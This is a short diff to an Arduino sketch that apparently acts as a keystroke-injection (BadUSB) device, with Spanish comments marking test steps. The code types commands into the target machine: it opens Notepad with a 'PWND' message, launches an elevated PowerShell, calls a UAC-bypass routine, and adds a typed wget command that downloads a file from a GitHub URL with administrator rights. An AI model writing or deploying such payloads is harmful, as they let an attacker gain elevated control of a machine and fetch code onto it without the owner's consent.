@@ -126,10 +126,12 @@ void setup() {
   runCommand("notepad.exe");
   printString("You're being PWND...");
   
-  // Abrir terminal de administrador
+  // Prueba 2: Abrir terminal de administrador
   runCommand("powershell Start-Process powershell -Verb runAs");
   bypassUAC();
-  printString("wget
+
+  // Prueba 3: Descargar fichero con permisos de administrador (deberia salir UAC para borrar)
+  printString("wget https://raw.githubusercontent.com/germanquero/arduGator/refs/heads/main/arduGator.ino");
 
   // ---
   // todo:
